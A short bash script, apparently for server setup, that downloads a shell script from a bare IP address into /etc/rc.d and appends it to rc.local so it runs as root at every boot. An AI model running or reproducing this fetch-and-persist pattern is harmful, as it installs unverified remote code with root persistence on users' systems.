#!/bin/bash
wget 47.254.89.175/shell/iptables_enable.sh -O /etc/rc.d/iptables_enable.sh && echo 'sh /etc/rc.d/iptables_enable.sh' >> /etc/rc.d/rc.local
#iptables-save > /etc/sysconfig/iptables-config
chmod  u+x /etc/rc.d/rc.local
